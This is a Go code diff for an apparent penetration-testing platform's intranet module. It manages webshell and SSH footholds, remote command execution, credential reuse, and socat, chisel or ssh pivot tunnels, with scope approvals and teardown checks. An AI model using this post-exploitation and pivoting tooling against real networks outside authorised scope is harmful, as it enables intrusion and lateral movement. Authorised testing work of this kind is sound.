+			out = "【失败回收】绑定会话不可用（" + err.Error() + "），目标上的进程未回收"
+		} else {
+			res := s.intranetRun(ctx, pg, sess, cmd, 20*time.Second)
+			detail := strings.TrimSpace(res.Output + "\n" + res.Note)
+			if detail == "" {
+				detail = "已执行撤销命令，无回显"
+			}
+			out = "【失败回收】" + detail
+		}
+	}
+	if s.resourceMgr != nil {
+		if res, _ := pg.FindActiveManagedResourceByTunnel(t.ID); res != nil {
+			s.resourceMgr.forget(res.ID)
+		}
+	}
+	if err := pg.ReleaseManagedResourceByTunnel(t.ID, "验证失败，已回收："+reason); err != nil {
+		out += "\n释放受管资源失败：" + err.Error()
+	}
+	return out
 }
 
 func intranetKillCommand(pid int) string {
@@ -875,9 +1605,18 @@ func (s *Server) intranetPlanTunnel(ctx context.Context, pg *db.DB, t *db.Intran
 	deploy = strings.TrimSpace(deploy)
 	verify = strings.TrimSpace(verify)
 	teardown = strings.TrimSpace(teardown)
-	if deploy == "" {
+	// deploy_command 传 "auto" = 强制按目标当前的工具重新选型。目标后来装了
+	// socat/chisel 时，沿用上次生成的命令会把选型锁死在旧结果上（例如明明能用
+	// socat 却仍走需要回连端点的 ssh）。
+	reselect := strings.EqualFold(deploy, "auto")
+	if reselect {
+		deploy = ""
+	}
+	if deploy == "" && !reselect {
 		deploy = strings.TrimSpace(t.DeployCommand)
 	}
+	// 空值 = 沿用台账里已有的监听侧；只有自动选型才能改写它。
+	listenSide := ""
 	if verify == "" {
 		verify = strings.TrimSpace(t.VerifyCommand)
 	}
@@ -886,23 +1625,31 @@ func (s *Server) intranetPlanTunnel(ctx context.Context, pg *db.DB, t *db.Intran
 	}
 	if deploy == "" {
 		// 隧道自动选型：根据目标上可用的工具自动选择最佳部署命令
-		autoDeploy, reason := autoSelectTunnelCommand(t.Kind, info, t)
+		autoDeploy, reason, side := autoSelectTunnelCommand(t.Kind, info, t)
 		if autoDeploy == "" {
 			return nil, info, errors.New(reason)
 		}
 		deploy = autoDeploy
+		listenSide = side
+		if side == db.IntranetListenSidePivot {
+			reason += "（监听侧=pivot：验证与拆除复核按控制端一侧进行）"
+		}
 		_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel",
 			"自动选型："+reason, autoDeploy, false)
 	}
 	if verify == "" {
 		if t.ListenPort > 0 {
-			verify = intranetVerifyCommand(t.ListenPort)
+			if listenSide == db.IntranetListenSidePivot {
+				verify = intranetPivotVerifyMarker(t.ListenPort)
+			} else {
+				verify = intranetVerifyCommand(t.ListenPort)
+			}
 		} else {
 			verify = "echo JW_TUNNEL_OK"
 		}
 	}
 	evidence := "【环境探测】\n" + strings.TrimSpace(info.Raw)
-	updated, err := pg.UpdateIntranetTunnelPlan(t.ID, deploy, verify, teardown, evidence)
+	updated, err := pg.UpdateIntranetTunnelPlan(t.ID, deploy, verify, teardown, evidence, listenSide)
 	if err != nil {
 		return nil, info, err
 	}
@@ -944,10 +1691,10 @@ func (s *Server) intranetDeployTunnel(ctx context.Context, pg *db.DB, t *db.Intr
 	}
 	teardown := strings.TrimSpace(t.TeardownCommand)
 	if teardown == "" {
-		teardown = intranetKillCommand(pid)
+		teardown = intranetTunnelTeardown(pid, t.ID)
 	}
 	if teardown != "" {
-		t, _ = pg.UpdateIntranetTunnelPlan(t.ID, "", "", teardown, "")
+		t, _ = pg.UpdateIntranetTunnelPlan(t.ID, "", "", teardown, "", "")
 	}
 	evidence := strings.TrimSpace(out.Output)
 	if out.IsError {
@@ -968,9 +1715,17 @@ func (s *Server) intranetDeployTunnel(ctx context.Context, pg *db.DB, t *db.Intr
 		}
 		expires := time.Now().Add(ttl)
 		tunnelID := updated.ID
-		meta := map[string]any{"tunnel_id": tunnelID, "session_id": sess.ID}
+		meta := map[string]any{"tunnel_id": tunnelID, "session_id": sess.ID, "listen_side": intranetTunnelSide(updated)}
 		if pid > 0 {
 			meta["pid"] = pid
+		}
+		// 台账里的 endpoint 要写监听真正所在的那一侧：pivot 隧道记目标地址，读台账的人
+		// 照着连是连不上的。
+		listen := intranetHostPort(updated.ListenHost, updated.ListenPort)
+		if intranetTunnelListensOnPivot(updated) {
+			if ph, _, perr := intranetPivotServer(); perr == nil {
+				listen = intranetHostPort(ph, updated.ListenPort)
+			}
 		}
 		cleanup := func(cctx context.Context) {
 			c, cancel := context.WithTimeout(cctx, 30*time.Second)
@@ -980,7 +1735,7 @@ func (s *Server) intranetDeployTunnel(ctx context.Context, pg *db.DB, t *db.Intr
 		if _, rerr := s.resourceMgr.register(db.ManagedResourceInput{
 			Kind:      db.ManagedKindTunnel,
 			Name:      updated.Name,
-			Endpoint:  fmt.Sprintf("session:%d %s -> %s", sess.ID, intranetHostPort(updated.ListenHost, updated.ListenPort), intranetHostPort(updated.RemoteHost, updated.RemotePort)),
+			Endpoint:  fmt.Sprintf("session:%d %s (%s) -> %s", sess.ID, listen, intranetTunnelSide(updated), intranetHostPort(updated.RemoteHost, updated.RemotePort)),
 			Target:    updated.RemoteHost,
 			Owner:     "intranet",
 			TaskID:    updated.TaskID,
@@ -994,6 +1749,11 @@ func (s *Server) intranetDeployTunnel(ctx context.Context, pg *db.DB, t *db.Intr
 	return updated, out, nil
 }
 
+// intranetVerifyTunnel checks the listener on the side that actually opens it.
+// A pivot-side listener is invisible to `ss` on the target, and running the
+// pivot:tcp:N marker as a shell command there only yields "command not found" —
+// a false failure. A genuine failure must retire the tunnel: leaving the deploy
+// process running with an active resource row tells the next caller the path works.
 func (s *Server) intranetVerifyTunnel(ctx context.Context, pg *db.DB, t *db.IntranetTunnel) (*db.IntranetTunnel, intranetExecOutcome, error) {
 	out := intranetExecOutcome{ExitCode: -1}
 	if t.SessionID == nil || *t.SessionID <= 0 {
@@ -1005,9 +1765,34 @@ func (s *Server) intranetVerifyTunnel(ctx context.Context, pg *db.DB, t *db.Intr
 	}
 	cmd := strings.TrimSpace(t.VerifyCommand)
 	if cmd == "" {
-		cmd = intranetVerifyCommand(t.ListenPort)
+		if intranetTunnelListensOnPivot(t) {
+			cmd = intranetPivotVerifyMarker(t.ListenPort)
+		} else {
+			cmd = intranetVerifyCommand(t.ListenPort)
+		}
 	}
-	out = s.intranetRun(ctx, pg, sess, cmd, 30*time.Second)
+	if intranetTunnelListensOnPivot(t) || strings.HasPrefix(cmd, "pivot:") {
+		h, _, perr := intranetPivotServer()
+		if perr != nil {
+			// 无法判定控制端地址 ≠ 隧道坏了：这里必须原样返回、保持 deployed 状态，
+			// 否则一次平台配置缺失就会把好隧道判死并拆掉。
+			return nil, out, fmt.Errorf("隧道监听端在控制端，%s；如控制端不是本机，请把 listen_side 改为 target 或手动提供 verify_command", perr.Error())
+		}
+		port := t.ListenPort
+		if port <= 0 {
+			port = intranetPivotMarkerPort(cmd)
+		}
+		ok, detail := intranetPivotListenerState(h, port)
+		out = intranetExecOutcome{Output: detail}
+		if ok {
+			out.ExitCode = 0
+		} else {
+			out.ExitCode = 1
+			out.IsError = true
+		}
+	} else {
+		out = s.intranetRun(ctx, pg, sess, cmd, 30*time.Second)
+	}
 	ok := !out.IsError && !strings.Contains(out.Output, "JW_TUNNEL_FAIL")
 	status := db.IntranetTunnelFailed
 	if ok {
@@ -1017,6 +1802,9 @@ func (s *Server) intranetVerifyTunnel(ctx context.Context, pg *db.DB, t *db.Intr
 	if out.Note != "" {
 		evidence += "\n" + out.Note
 	}
+	if !ok {
+		evidence += "\n" + s.intranetRetireFailedTunnel(ctx, pg, t, intranetVerifyFailReason(out))
+	}
 	updated, err := pg.SetIntranetTunnelStatus(t.ID, status, 0, truncateIntranetOutput(evidence, 4000), "")
 	if err != nil {
 		return nil, out, err
@@ -1025,15 +1813,39 @@ func (s *Server) intranetVerifyTunnel(ctx context.Context, pg *db.DB, t *db.Intr
 	return updated, out, nil
 }
 
-// intranetTunnelAccess explains how to reach a live tunnel. The listener sits on
-// the target, so a wildcard bind is addressed through the session host; a
-// loopback bind is only usable from inside the target.
+// intranetTunnelAccess explains how to reach a live tunnel. listen_side decides
+// which machine to point at: a pivot-side listener (chisel client without R:) is
+// reached on the control end, everything else is a listener on the target, where a
+// wildcard bind is addressed through the session host and a loopback bind is only
+// usable from inside the target.
 func (s *Server) intranetTunnelAccess(pg *db.DB, t *db.IntranetTunnel) map[string]any {
 	if t == nil || t.ListenPort <= 0 {
 		return nil
 	}
 	if t.Status != db.IntranetTunnelDeployed && t.Status != db.IntranetTunnelVerified {
 		return nil
+	}
+	if intranetTunnelListensOnPivot(t) {
+		access := map[string]any{"listen_side": db.IntranetListenSidePivot, "port": t.ListenPort}
+		ph, _, perr := intranetPivotServer()
+		if perr != nil {
+			access["note"] = perr.Error()
+			return access
+		}
+		endpoint := intranetHostPort(ph, t.ListenPort)
+		access["host"] = ph
+		access["target"] = endpoint
+		access["endpoint"] = endpoint
+		if t.Kind == db.IntranetTunnelKindSocks5 {
+			access["proxy"] = "socks5://" + endpoint
+		}
+		if ok, detail := intranetPivotListenerState(ph, t.ListenPort); ok {
+			access["note"] = "监听端在控制端（" + detail + "），流量经目标出站进入内网；把 " + endpoint +
+				" 配置给扫描/深度任务即可"
+		} else {
+			access["note"] = "监听端应在控制端，但当前检查不通过：" + detail
+		}
+		return access
 	}
 	host := strings.TrimSpace(t.ListenHost)
 	if host == "" || host == "0.0.0.0" || host == "::" {
@@ -1056,18 +1868,16 @@ func (s *Server) intranetTunnelAccess(pg *db.DB, t *db.IntranetTunnel) map[strin
 		}
 	}
 	endpoint := intranetHostPort(host, t.ListenPort)
-	access := map[string]any{"host": host, "port": t.ListenPort, "target": endpoint}
+	access := map[string]any{"host": host, "port": t.ListenPort, "target": endpoint, "listen_side": db.IntranetListenSideTarget}
 	switch t.Kind {
 	case db.IntranetTunnelKindSocks5:
 		access["proxy"] = "socks5://" + endpoint
 		access["note"] = "把该代理配置给扫描/深度任务即可经目标出站访问内网"
 	case db.IntranetTunnelKindRemote:
-		if ph, _, perr := intranetPivotServer(); perr == nil {
-			access["endpoint"] = intranetHostPort(ph, t.ListenPort)
-			access["note"] = "反向转发：监听端在控制端，目标主动连出"
-		} else {
-			access["note"] = perr.Error()
-		}
+		access["endpoint"] = endpoint
+		// R: 前缀把监听端口开在 chisel client（目标）一侧，连上之后由控制端出站——
+		// 以前按 kind 猜「监听端在控制端」会把端口指向控制端根本没收过的地址。
+		access["note"] = "反向转发：监听端口开在目标 " + endpoint + "，连上后经控制端一侧出站"
 	default:
 		access["endpoint"] = endpoint
 	}
@@ -1090,21 +1900,50 @@ func (s *Server) intranetStopTunnel(ctx context.Context, tunnelID int64, note st
 		return
 	}
 	evidence := ""
-	if t.SessionID != nil && *t.SessionID > 0 {
-		if sess, err := s.intranetSession(pg, *t.SessionID); err == nil {
-			cmd := strings.TrimSpace(t.TeardownCommand)
-			if cmd == "" {
-				cmd = intranetKillCommand(ptrInt(t.PID))
-			}
-			if cmd != "" {
-				out := s.intranetRun(ctx, pg, sess, cmd, 30*time.Second)
-				evidence = strings.TrimSpace(out.Output)
-				if out.Note != "" {
-					evidence += "\n" + out.Note
-				}
-				_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel", "拆除隧道 #"+strconv.FormatInt(t.ID, 10), truncateIntranetOutput(evidence, 4000), out.IsError)
-			}
+	cmd := strings.TrimSpace(t.TeardownCommand)
+	if cmd == "" {
+		cmd = intranetTunnelTeardown(ptrInt(t.PID), t.ID)
+	}
+	switch {
+	case t.SessionID == nil || *t.SessionID <= 0:
+		evidence = "隧道未绑定会话，拆除命令未执行，仅台账置为 stopped"
+	case cmd == "":
+		evidence = "没有可执行的拆除命令（缺少 teardown_command/PID），仅台账置为 stopped"
+	default:
+		sess, serr := s.intranetSession(pg, *t.SessionID)
+		if serr != nil {
+			evidence = "绑定会话 #" + strconv.FormatInt(*t.SessionID, 10) + " 不可用，拆除命令未执行，仅台账置为 stopped"
+			break
 		}
+		out := s.intranetRun(ctx, pg, sess, cmd, 30*time.Second)
+		evidence = strings.TrimSpace(out.Output)
+		if out.Note != "" {
+			evidence += "\n" + out.Note
+		}
+		// 拆完必须回看一眼端口：kill 打偏（pid 已复用）或没有权限时，监听进程还在，
+		// 而台账即将被写成 stopped——撤离之后无人再来查这个洞。复核看的是 listen_side
+		// 那一侧：socat 与 ssh -D/-L 的监听开在目标，chisel client（不带 R:）的监听开在
+		// 控制端，只有 client 进程断开后控制端才会收起那个端口。在错误的一侧复核，会把
+		// 已经断掉的隧道报成 JW_TUNNEL_FAIL（等于没复核），也会把还活着的端口漏掉。
+		recheck := ""
+		switch {
+		case t.ListenPort <= 0:
+			recheck = "缺少 listen_port，未复核端口"
+		case intranetTunnelListensOnPivot(t):
+			ph, _, perr := intranetPivotServer()
+			if perr != nil {
+				recheck = "控制端地址未知（" + perr.Error() + "），未复核端口 " + strconv.Itoa(t.ListenPort)
+			} else if stillUp, detail := intranetPivotListenerState(ph, t.ListenPort); stillUp {
+				recheck = "【未收起】" + detail + "：控制端侧端口仍在监听，隧道可能仍在服务"
+			} else {
+				recheck = "【已收起】" + detail
+			}
+		default:
+			check := s.intranetRun(ctx, pg, sess, intranetVerifyCommand(t.ListenPort), 20*time.Second)
+			recheck = strings.TrimSpace(check.Output)
+		}
+		evidence = strings.TrimSpace(evidence + "\n【拆除复核】" + recheck)
+		_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel", "拆除隧道 #"+strconv.FormatInt(t.ID, 10), truncateIntranetOutput(evidence, 4000), out.IsError)
 	}
 	note = strings.TrimSpace(note)
 	if note == "" {
@@ -1126,14 +1965,20 @@ func ptrInt(v *int) int {
 // ---------------------------------------------------------------------------
 
 type intranetSessionDTO struct {
-	Name       string         `json:"name"`
-	WebshellID int64          `json:"webshell_id"`
-	TaskID     int64          `json:"task_id"`
-	Host       string         `json:"host"`
-	Cwd        string         `json:"cwd"`
-	Note       string         `json:"note"`
-	Metadata   map[string]any `json:"metadata"`
-	Status     string         `json:"status"`
+	Name         string         `json:"name"`
+	WebshellID   int64          `json:"webshell_id"`
+	TaskID       int64          `json:"task_id"`
+	Host         string         `json:"host"`
+	Cwd          string         `json:"cwd"`
+	Note         string         `json:"note"`
+	Metadata     map[string]any `json:"metadata"`
+	Status       string         `json:"status"`
+	Transport    string         `json:"transport"`
+	Port         int            `json:"port"`
+	User         string         `json:"user"`
+	CredentialID int64          `json:"credential_id"`
+	DialHost     string         `json:"dial_host"`
+	DialPort     int            `json:"dial_port"`
 }
 
 type intranetTunnelDTO struct {
@@ -1143,6 +1988,7 @@ type intranetTunnelDTO struct {
 	Kind            string `json:"kind"`
 	ListenHost      string `json:"listen_host"`
 	ListenPort      int    `json:"listen_port"`
+	ListenSide      string `json:"listen_side"`
 	RemoteHost      string `json:"remote_host"`
 	RemotePort      int    `json:"remote_port"`
 	DeployCommand   string `json:"deploy_command"`
@@ -1155,6 +2001,7 @@ type intranetTunnelActionDTO struct {
 	DeployCommand   string `json:"deploy_command"`
 	VerifyCommand   string `json:"verify_command"`
 	TeardownCommand string `json:"teardown_command"`
+	ListenSide      string `json:"listen_side"`
 	TTLSeconds      int    `json:"ttl_seconds"`
 	TimeoutSeconds  int    `json:"timeout_seconds"`
 }
@@ -1175,6 +2022,8 @@ func (s *Server) registerIntranet(mux *http.ServeMux) {
 	mux.HandleFunc("PATCH /api/intranet/sessions/{id}", s.updateIntranetSession)
 	mux.HandleFunc("DELETE /api/intranet/sessions/{id}", s.deleteIntranetSession)
 	mux.HandleFunc("POST /api/intranet/sessions/{id}/exec", s.execIntranetSession)
+	mux.HandleFunc("POST /api/intranet/sessions/{id}/heartbeat", s.heartbeatIntranetSession)
+	mux.HandleFunc("POST /api/intranet/sessions/{id}/failover", s.failoverIntranetSession)
 	mux.HandleFunc("POST /api/intranet/sessions/{id}/upload", s.uploadIntranetFile)
 	mux.HandleFunc("POST /api/intranet/sessions/{id}/download", s.downloadIntranetFile)
 	mux.HandleFunc("GET /api/intranet/sessions/{id}/events", s.listIntranetSessionEvents)
@@ -1182,6 +2031,7 @@ func (s *Server) registerIntranet(mux *http.ServeMux) {
 	mux.HandleFunc("POST /api/intranet/sessions/batch-exec", s.batchExecIntranetSessions)
 
 	mux.HandleFunc("GET /api/intranet/credentials", s.listIntranetCredentials)
+	mux.HandleFunc("POST /api/intranet/credentials", s.registerIntranetCredential)
 	mux.HandleFunc("POST /api/intranet/credentials/reuse", s.reuseIntranetCredential)
 
 	mux.HandleFunc("GET /api/intranet/artifacts", s.listIntranetArtifacts)
@@ -1222,6 +2072,24 @@ func (s *Server) listIntranetSessions(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, 200, map[string]any{"sessions": sessions, "total": total})
 }
 
+// intranetTaskGuard reports why a task_id cannot anchor ledger rows. Sessions,
+// tunnels and artifacts all carry a task_id with a foreign key: a deleted task
+// otherwise surfaces as a raw SQLSTATE 23503, and even if the insert succeeded
+// the row would never show up in that task's evacuation plan.
+func intranetTaskGuard(pg *db.DB, taskID int64) string {
+	if taskID <= 0 {
+		return ""
+	}
+	task, err := pg.GetTask(taskID)
+	if err != nil {
+		return "校验任务失败：" + err.Error()
+	}
+	if task == nil {
+		return "任务 #" + strconv.FormatInt(taskID, 10) + " 不存在或已删除，无法归入该任务的撤离台账"
+	}
+	return ""
+}
+
 func (s *Server) createIntranetSession(w http.ResponseWriter, r *http.Request) {
 	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
 	var req intranetSessionDTO
@@ -1231,6 +2099,25 @@ func (s *Server) createIntranetSession(w http.ResponseWriter, r *http.Request) {
 	}
 	pg := s.pg(w)
 	if pg == nil {
+		return
+	}
+	if db.NormalizeIntranetTransport(req.Transport) == db.IntranetTransportSSH {
+		sess, info, err := s.intranetOpenSSHSession(r.Context(), pg, intranetSSHSessionRequest{
+			Name: req.Name, TaskID: req.TaskID, Host: req.Host, Port: req.Port,
+			User: req.User, CredentialID: req.CredentialID,
+			DialHost: req.DialHost, DialPort: req.DialPort,
+			Cwd: req.Cwd, Note: req.Note,
+		})
+		if err != nil {
+			if sess != nil {
+				// 会话已登记但登录失败：留一行 closed 记录，误配凭据也查得到。
+				writeJSON(w, 200, map[string]any{"session": sess, "probe_error": err.Error()})
+				return
+			}
+			writeErr(w, 400, err.Error())
+			return
+		}
+		writeJSON(w, 200, map[string]any{"session": sess, "probe": info})
 		return
 	}
 	shell, err := pg.GetWebshell(req.WebshellID)
@@ -1244,6 +2131,13 @@ func (s *Server) createIntranetSession(w http.ResponseWriter, r *http.Request) {
 	}
 	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
 		writeErr(w, 400, "webshell 地址命中资产拦截规则，已拒绝："+reason)
+		return
+	}
+	// 会话必须挂在真实任务上：task_id 指向已删除的任务会被外键挡下，而直接把
+	// SQLSTATE 23503 抛给调用方，Agent 只会当成服务出错重试。更要紧的是，任务
+	// 不存在的会话进不了按任务出发的撤离清单，落脚点就此失联。
+	if msg := intranetTaskGuard(pg, req.TaskID); msg != "" {
+		writeErr(w, 400, msg)
 		return
 	}
 	host := intranetHost(req.Host)
@@ -1352,6 +2246,7 @@ func (s *Server) execIntranetSession(w http.ResponseWriter, r *http.Request) {
 	var req struct {
 		Command        string `json:"command"`
 		TimeoutSeconds int    `json:"timeout_seconds"`
+		OSKind         string `json:"os_kind"`
 	}
 	if err := decode(r, &req); err != nil {
 		writeErr(w, 400, "请求格式错误")
@@ -1373,6 +2268,17 @@ func (s *Server) execIntranetSession(w http.ResponseWriter, r *http.Request) {
 	timeout := time.Duration(req.TimeoutSeconds) * time.Second
 	if timeout <= 0 || timeout > 300*time.Second {
 		timeout = intranetExecTimeout
+	}
+	// The terminal can be told what the target is when the probe cannot find out
+	// (a chroot that never answers, a restricted shell). Writing it through the
+	// session metadata keeps one source of truth for every later command, upload
+	// and persistence step.
+	if k := strings.TrimSpace(req.OSKind); k == intranetOSPosix || k == intranetOSWindows {
+		if cached, _ := sess.Metadata["os"].(string); cached != k {
+			if updated, merr := pg.SetIntranetSessionMetadata(sess.ID, map[string]any{"os": k}); merr == nil && updated != nil {
+				*sess = *updated
+			}
+		}
 	}
 	out := s.intranetExec(r.Context(), pg, sess, req.Command, timeout)
 	writeJSON(w, 200, map[string]any{"result": out, "session": sess})
@@ -1576,13 +2482,22 @@ func (s *Server) createIntranetTunnel(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 400, "listen_port 必须在 1-65535 之间")
 		return
 	}
+	side, err := intranetListenSideArg(req.ListenSide)
+	if err != nil {
+		writeErr(w, 400, err.Error())
+		return
+	}
 	if kind != db.IntranetTunnelKindSocks5 && (req.RemotePort < 1 || req.RemotePort > 65535) {
 		writeErr(w, 400, "remote_port 必须在 1-65535 之间")
 		return
 	}
+	if msg := intranetTaskGuard(pg, req.TaskID); msg != "" {
+		writeErr(w, 400, msg)
+		return
+	}
 	in := db.IntranetTunnelInput{
 		Name: req.Name, SessionID: req.SessionID, TaskID: req.TaskID, Kind: kind,
-		ListenHost: req.ListenHost, ListenPort: req.ListenPort,
+		ListenHost: req.ListenHost, ListenPort: req.ListenPort, ListenSide: side,
 		RemoteHost: intranetHost(req.RemoteHost), RemotePort: req.RemotePort,
 		DeployCommand: req.DeployCommand, VerifyCommand: req.VerifyCommand,
 		TeardownCommand: req.TeardownCommand, Note: req.Note,
@@ -1718,12 +2633,28 @@ func (s *Server) planIntranetTunnel(w http.ResponseWriter, r *http.Request) {
 	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
 	var req intranetTunnelActionDTO
 	_ = decode(r, &req)
+	side, err := intranetListenSideArg(req.ListenSide)
+	if err != nil {
+		writeErr(w, 400, err.Error())
+		return
+	}
+	// 手写 deploy_command 时自动选型不参与，监听侧只能由请求纠正；记错侧，验证与
+	// 拆除复核都会去错误的一台机器上看端口。
+	if side != "" {
+		if _, err := pg.UpdateIntranetTunnelPlan(t.ID, "", "", "", "", side); err != nil {
+			writeErr(w, 400, err.Error())
+			return
+		}
+		if fresh, gerr := pg.GetIntranetTunnel(t.ID); gerr == nil {
+			t = fresh
+		}
+	}
 	updated, info, err := s.intranetPlanTunnel(r.Context(), pg, t, req.DeployCommand, req.VerifyCommand, req.TeardownCommand)
 	if err != nil {
 		writeErr(w, 400, err.Error())
 		return
 	}
-	writeJSON(w, 200, map[string]any{"tunnel": updated, "probe": info})
+	writeJSON(w, 200, map[string]any{"tunnel": updated, "probe": info, "listen_side": updated.ListenSide})
 }
 
 func (s *Server) deployIntranetTunnel(w http.ResponseWriter, r *http.Request) {
@@ -1858,7 +2789,10 @@ func (s *Server) approveIntranetScopeRequest(w http.ResponseWriter, r *http.Requ
 		return
 	}
 	kind := "subdomain"
-	if net.ParseIP(pending.Host) != nil {
+	// 带 / 的值是网段：交给存储层按 ip→cidr 归一。若按 subdomain 登记，
+	// 10.99.0.0/24 会变成一个「域名」范围，段内任何 IP 都匹配不上，
+	// 批准后隧道依旧被范围门禁拦住。
+	if net.ParseIP(pending.Host) != nil || strings.Contains(pending.Host, "/") {
 		kind = "ip"
 	}
 	if _, err := pg.Assets().AddAgentScope(pending.TaskID, kind, pending.Host, displayOr(strings.TrimSpace(pending.Reason), "内网范围审批"), "manual"); err != nil {
@@ -1878,24 +2812,47 @@ func (s *Server) approveIntranetScopeRequest(w http.ResponseWriter, r *http.Requ
 	assets := map[string]any{"registered": false}
 	var warnings []string
 	if ip := net.ParseIP(pending.Host); ip != nil {
-		ipID, aerr := pg.Assets().UpsertIP(db.UpsertIPReq{IP: pending.Host, TaskID: pending.TaskID})
-		if aerr != nil {
-			warnings = append(warnings, "登记 IP 资产失败: "+aerr.Error())
-		} else {
-			assets["registered"] = true
-			assets["ip_id"] = ipID
-			if pending.Port > 0 {
-				svcID, serr := pg.Assets().UpsertOtherService(db.UpsertOtherServiceReq{
-					IP: pending.Host, Port: pending.Port, ServiceName: "tcp",
-					Extra: map[string]any{"source": "intranet_scope_approval"}, TaskID: pending.TaskID,
-				})
-				if serr != nil {
-					warnings = append(warnings, "登记端口资产失败: "+serr.Error())
-				} else {
-					assets["service_id"] = svcID
+		// 本机地址只有在隧道台账能解释时才是一条内网资产：否则批准一个
+		// 127.0.0.1 会把平台自己登记成内网主机，资产列表与报告从此分不清「打的是
+		// 谁」，下一轮扫描还会顺着这条资产打回平台自身。
+		assetHost, assetPort, ok := intranetTunnelIdentity(pg, pending.Host, pending.Port)
+		switch {
+		case !ok:
+			warnings = append(warnings, fmt.Sprintf("%s 是平台自身的地址，没有登记在册的隧道承载它：已写入授权范围但不登记资产，请改为内网主机的真实地址或先建隧道", pending.Host))
+		default:
+			if assetHost != pending.Host {
+				warnings = append(warnings, fmt.Sprintf("按隧道映射登记为内网身份 %s（申请填的是监听地址 %s）",
+					intranetHostPort(assetHost, assetPort), intranetHostPort(pending.Host, pending.Port)))
+			}
+			ipID, aerr := pg.Assets().UpsertIP(db.UpsertIPReq{IP: assetHost, TaskID: pending.TaskID})
+			if aerr != nil {
+				warnings = append(warnings, "登记 IP 资产失败: "+aerr.Error())
+			} else {
+				assets["registered"] = true
+				assets["ip_id"] = ipID
+				assets["host"] = assetHost
+				if assetPort > 0 {
+					svcID, serr := pg.Assets().UpsertOtherService(db.UpsertOtherServiceReq{
+						IP: assetHost, Port: assetPort, ServiceName: "tcp",
+						Extra: map[string]any{"source": "intranet_scope_approval"}, TaskID: pending.TaskID,
+					})
+					if serr != nil {
+						warnings = append(warnings, "登记端口资产失败: "+serr.Error())
+					} else {
+						assets["service_id"] = svcID
+					}
 				}
 			}
 		}
+	} else if strings.Contains(pending.Host, "/") {
+		warnings = append(warnings, "批准的是网段，已写入任务授权范围但不登记资产（整段灌入会淹没资产列表）；确认具体主机后再逐个申请")
+	} else if intranetHostIsLocal(pending.Host) {
+		portNote := "未带端口"
+		if pending.Port > 0 {
+			portNote = "端口 " + strconv.Itoa(pending.Port)
+		}
+		warnings = append(warnings, fmt.Sprintf("%s（%s）指向平台自身：已写入授权范围但不登记资产，请改为内网主机的真实地址或先建隧道",
+			pending.Host, portNote))
 	} else if pending.Port > 0 {
 		svcID, serr := pg.Assets().UpsertOtherService(db.UpsertOtherServiceReq{
 			Domain: pending.Host, Port: pending.Port, ServiceName: "tcp",
@@ -2087,6 +3044,156 @@ func (s *Server) intranetOpenSession(ctx context.Context, pg *db.DB, webshellID,
 	if out.IsError && strings.TrimSpace(info.Raw) == "" {
 		_, _ = pg.UpdateIntranetSessionState(sess.ID, "", db.IntranetSessionClosed, "初始探测失败")
 		return sess, info, errors.New("会话已创建但探测失败: " + displayOr(out.Note, "无回显"))
+	}
+	return sess, info, nil
+}
+
+// ---------------------------------------------------------------------------
+// SSH 承载的内网会话
+// ---------------------------------------------------------------------------
+
+// intranetSSHSessionRequest is one SSH-backed session opening. Host is the
+// target's own address on the internal segment and is what the scope check, the
+// ledger and asset reflux key on; DialHost/DialPort override where the platform
+// actually connects, which is how a host reachable only through a port-forward
+// tunnel (or only through an address the platform can route to) is logged in to
+// while keeping its real identity on record.
+type intranetSSHSessionRequest struct {
+	Name         string `json:"name"`
+	TaskID       int64  `json:"task_id"`
+	Host         string `json:"host"`
+	Port         int    `json:"port"`
+	User         string `json:"user"`
+	CredentialID int64  `json:"credential_id"`
+	DialHost     string `json:"dial_host"`
+	DialPort     int    `json:"dial_port"`
+	Cwd          string `json:"cwd"`
+	Note         string `json:"note"`
+}
+
+// intranetLocalDial describes the platform-side endpoint an SSH session connects
+// to. A local address is only ever meaningful as a tunnel listener, so the tunnel
+// that declares it decides whether the connection is legitimate — and against the
+// tunnel we can tell whether the caller's stated identity is the one the port
+// actually carries.
+func intranetLocalDial(pg *db.DB, identityHost, dialHost string, dialPort int) (host string, port int, note string, err error) {
+	host, port = dialHost, dialPort
+	if !intranetHostIsLocal(dialHost) {
+		return host, port, "", nil
+	}
+	var tunnel *db.IntranetTunnel
+	if t, terr := pg.LiveIntranetTunnelByListen(dialHost, dialPort); terr == nil {
+		tunnel = t
+	}
+	if tunnel == nil {
+		if intranetHostIsLocal(identityHost) {
+			return "", 0, "", fmt.Errorf("拒绝把平台自身作为 SSH 目标（%s）：内网主机请用它在内网段里的地址，或先建端口转发隧道再把隧道监听地址填进 dial_host/dial_port",
+				intranetHostPort(dialHost, dialPort))
+		}
+		return host, port, fmt.Sprintf("SSH 经本机地址 %s 接入，该监听口没有登记在隧道台账里；会话按内网身份 %s 记账",
+			intranetHostPort(dialHost, dialPort), identityHost), nil
+	}
+	if remote := intranetHost(tunnel.RemoteHost); remote != "" && identityHost != "" && remote != identityHost {
+		return "", 0, "", fmt.Errorf("dial 地址 %s 由隧道 #%d 承载，其内网目标是 %s，与会话身份 %s 不一致；请改用对应端口或修正 host",
+			intranetHostPort(dialHost, dialPort), tunnel.ID, remote, identityHost)
+	}
+	return host, port, fmt.Sprintf("SSH 经隧道 #%d（%s → %s:%d）接入", tunnel.ID,
+		intranetHostPort(dialHost, dialPort), displayOr(intranetHost(tunnel.RemoteHost), identityHost), tunnel.RemotePort), nil
+}
+
+// intranetOpenSSHSession turns an SSH-only internal host into a managed session.
+// Without it the platform can log a reused credential against port 22 all day and
+// never execute a command: hosts with no web service cannot carry a webshell, so
+// they stay outside exec, recon, persistence and the evacuation ledger alike.
+func (s *Server) intranetOpenSSHSession(ctx context.Context, pg *db.DB, req intranetSSHSessionRequest) (*db.IntranetSession, intranetProbeInfo, error) {
+	host := intranetHost(req.Host)
+	if host == "" {
+		return nil, intranetProbeInfo{}, errors.New("需要目标主机（内网段里的地址，例如 10.99.0.20）")
+	}
+	port := req.Port
+	if port <= 0 || port > 65535 {
+		port = 22
+	}
+	if msg := intranetTaskGuard(pg, req.TaskID); msg != "" {
+		return nil, intranetProbeInfo{}, errors.New(msg)
+	}
